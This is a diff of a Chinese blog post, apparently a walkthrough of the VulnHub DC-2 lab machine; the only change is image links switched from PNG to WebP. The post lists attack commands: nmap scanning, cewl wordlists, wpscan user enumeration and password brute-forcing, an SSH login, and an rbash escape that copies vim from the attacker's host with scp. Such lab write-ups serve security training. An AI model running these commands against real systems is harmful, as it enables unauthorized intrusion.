@@ -13,25 +13,25 @@ ShowToc: true
 
 dc-2自定义数组和取值方式
 
-![VulnHub DC-2 靶机实战 示意图 1](/images/linux-notes/vulnhub-dc-2/img-01.png)
+![VulnHub DC-2 靶机实战 示意图 1](/images/linux-notes/vulnhub-dc-2/img-01.webp)
 
 系统变量取值使用方式
 
-![VulnHub DC-2 靶机实战 示意图 2](/images/linux-notes/vulnhub-dc-2/img-02.png)
+![VulnHub DC-2 靶机实战 示意图 2](/images/linux-notes/vulnhub-dc-2/img-02.webp)
 
 1、信息收集nmap -sP 192.168.133.0/24 nmap -A -p- 192.168.133.140
 
-![VulnHub DC-2 靶机实战 示意图 3](/images/linux-notes/vulnhub-dc-2/img-03.png)
+![VulnHub DC-2 靶机实战 示意图 3](/images/linux-notes/vulnhub-dc-2/img-03.webp)
 
 ！ 访问80端口--自动跳转DC-2网站不允许使用IP访问
 
   - hosts可以修改
 
-![VulnHub DC-2 靶机实战 示意图 4](/images/linux-notes/vulnhub-dc-2/img-04.png)
+![VulnHub DC-2 靶机实战 示意图 4](/images/linux-notes/vulnhub-dc-2/img-04.webp)
 
 访问80
 
-![VulnHub DC-2 靶机实战 示意图 5](/images/linux-notes/vulnhub-dc-2/img-05.png)
+![VulnHub DC-2 靶机实战 示意图 5](/images/linux-notes/vulnhub-dc-2/img-05.webp)
 
 ！cewl <目标URL> -w 输出文件.txt@cewl http://dc-2 -w test.txt
 
@@ -41,11 +41,11 @@ nikto -url
 
 3、wpscan
 
-![VulnHub DC-2 靶机实战 示意图 6](/images/linux-notes/vulnhub-dc-2/img-06.png)
+![VulnHub DC-2 靶机实战 示意图 6](/images/linux-notes/vulnhub-dc-2/img-06.webp)
 
 wpscan --update  先升级才能使用wpscan --url http://dc-2 -e u    爆破平台的账户
 
-![VulnHub DC-2 靶机实战 示意图 7](/images/linux-notes/vulnhub-dc-2/img-07.png)
+![VulnHub DC-2 靶机实战 示意图 7](/images/linux-notes/vulnhub-dc-2/img-07.webp)
 
 ！爆破账号字典 user.txt密码字典 test.txt wpscan --url http://dc-2 -U user.txt -P test.txt
 
@@ -55,15 +55,15 @@ wpscan --update  先升级才能使用wpscan --url http://dc-2 -e u    爆破平
 
 ! 登录账号-----考虑ssh登录ssh jerry@192.168.133.140 -p 7744
 
-![VulnHub DC-2 靶机实战 示意图 8](/images/linux-notes/vulnhub-dc-2/img-08.png)
+![VulnHub DC-2 靶机实战 示意图 8](/images/linux-notes/vulnhub-dc-2/img-08.webp)
 
-![VulnHub DC-2 靶机实战 示意图 9](/images/linux-notes/vulnhub-dc-2/img-09.png)
+![VulnHub DC-2 靶机实战 示意图 9](/images/linux-notes/vulnhub-dc-2/img-09.webp)
 
 ！ rbash绕过首先先查看当前用户能执行哪些命令（查看环境变量）
 
 echo $PATH
 
-![VulnHub DC-2 靶机实战 示意图 10](/images/linux-notes/vulnhub-dc-2/img-10.png)
+![VulnHub DC-2 靶机实战 示意图 10](/images/linux-notes/vulnhub-dc-2/img-10.webp)
 
 ！scp 把kali系统的vim 命令字复制到tom用户的bin下scp root@192.168.133.130:/usr/bin/vim /home/tom/usr/bin（xxxx）失败方法一：
 
